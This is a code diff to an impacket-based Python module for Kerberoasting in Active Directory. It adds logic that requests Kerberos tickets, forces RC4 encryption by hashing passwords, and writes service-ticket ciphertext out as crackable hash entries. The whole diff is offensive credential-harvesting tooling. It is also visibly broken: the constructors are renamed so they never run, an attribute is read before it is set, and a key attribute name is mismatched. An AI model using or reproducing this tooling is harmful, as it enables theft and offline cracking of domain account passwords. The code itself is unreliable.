@@ -10,12 +10,14 @@ from impacket import version
 from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_DONT_REQUIRE_PREAUTH
 from impacket.examples import logger
 from impacket.krb5 import constants
-from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, KRB_ERROR, AS_REP, seq_set, seq_set_iter
+from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, KRB_ERROR, AS_REP, seq_set, seq_set_iter, TGS_REP
 #from impacket.krb5.kerberosv5 import sendReceive, KerberosError
 from impacket.krb5.types import KerberosTime, Principal
 from impacket.ldap import ldap, ldapasn1
 from impacket.smbconnection import SMBConnection
 import traceback
+from binascii import unhexlify, hexlify
+from impacket.ntlm import compute_lmhash, compute_nthash
 import socket
 try:
     import utils.kerb5getuserspnnopreauth as kerb5nopreauth
@@ -24,7 +26,7 @@ except ImportError:
     
 from kerb5getuserspnnopreauth import sendReceive, KerberosError, getKerberosTGS, getKerberosTGT
 class TGT:
-    def __init__(self, domain, username, dc, password='', nthash='', lmhash='', aeskey=''):
+    def init(self, domain, username, dc, password='', nthash='', lmhash='', aeskey=''):
         self.username = username
         self.domain = domain
         self.password = password
@@ -135,7 +137,7 @@ def getName(machine):
 
 
 class TGS:
-    def __init__(self, domain, tgt,username, cipher, oldSessionKey, newSessionKey,dc,password='', nthash=None, lmhash=None,preauth=False, aeskey=None):
+    def init(self, domain,dc,username, cipher=None, oldSessionKey=None, newSessionKey=None,tgt=None,kdcIP=None,password='', nthash=None, lmhash=None,preauth=False, aeskey=None):
         self.tgt = tgt
         self.cipher=cipher
         self.old = oldSessionKey
@@ -148,16 +150,46 @@ class TGS:
         self.preauth = preauth
         self.aeskey = aeskey
         self.domain = domain
-        if self.preauth == True:
-            no_preauth = False
+        if kdcIP is None:
+            self.kdcIP = self.dc_ip
         else:
-            no_preauth = True
+            self.kdcIP = kdcIP
         self.dc_ip = socket.gethostbyname(self.dc)
-        #if not (oldSessionKey or cipher or newSessionKey):
-        #    userName = Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-        #    self.tgt, self.cipher, self.old, self.new = getKerberosTGT(userName, self.password, self.domain, self.lmhash, self.nthash, self.aeskey, kdcHost=self.dc_ip, kerberoast_no_preauth=no_preauth)
+        if not (oldSessionKey or cipher or newSessionKey):
+           self.getTGT()
+           
+    def getTGT(self):
 
+        # No TGT in cache, request it
+        userName = Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
 
+        # In order to maximize the probability of getting session tickets with RC4 etype, we will convert the
+        # password to ntlm hashes (that will force to use RC4 for the TGT). If that doesn't work, we use the
+        # cleartext password.
+        # If no clear text password is provided, we just go with the defaults.
+        if self.password != '' and (self.lmhash == '' and self.nthash == ''):
+            try:
+                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, '', self.domain,
+                                                                        compute_lmhash(self.password),
+                                                                        compute_nthash(self.password), self.aesKey,
+                                                                        kdcHost=self.kdcIP)
+            except Exception as e:
+                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.password, self.domain,
+                                                                        unhexlify(self.lmhash),
+                                                                        unhexlify(self.nthash), self.aesKey,
+                                                                        kdcHost=self.kdcIP)
+
+        else:
+            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.password, self.domain,
+                                                                    unhexlify(self.lmhash),
+                                                                    unhexlify(self.nthash), self.aesKey,
+                                                                    kdcHost=self.kdcIP)
+        TGT = {}
+        TGT['KDC_REP'] = tgt
+        TGT['cipher'] = cipher
+        TGT['sessionKey'] = sessionKey
+
+        return TGT
 
 
 
@@ -186,7 +218,8 @@ class TGS:
                 hexlify(decodes['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                 hexlify(decodes['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
             if fd is None:
-                print(entry)
+                #print(entry)
+                None
             else:
                 fd.write(entry + '\n')
         elif decodes['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
@@ -196,7 +229,8 @@ class TGS:
                 hexlify(decodes['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                 hexlify(decodes['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
             if fd is None:
-                print(entry)
+                #print(entry)
+                None
             else:
                 fd.write(entry + '\n')
         elif decodes['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
@@ -206,7 +240,8 @@ class TGS:
                 hexlify(decodes['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                 hexlify(decodes['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
             if fd is None:
-                print(entry)
+                #print(entry)
+                None
             else:
                 fd.write(entry + '\n')
         elif decodes['ticket']['enc-part']['etype'] == constants.EncryptionTypes.des_cbc_md5.value:
@@ -216,8 +251,10 @@ class TGS:
                 hexlify(decodes['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                 hexlify(decodes['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
             if fd is None:
-                print(entry)
+                #print(entry)
+                None
             else:
                 fd.write(entry + '\n')
+        print(f"user is kerberoastable ")
         return entry
 
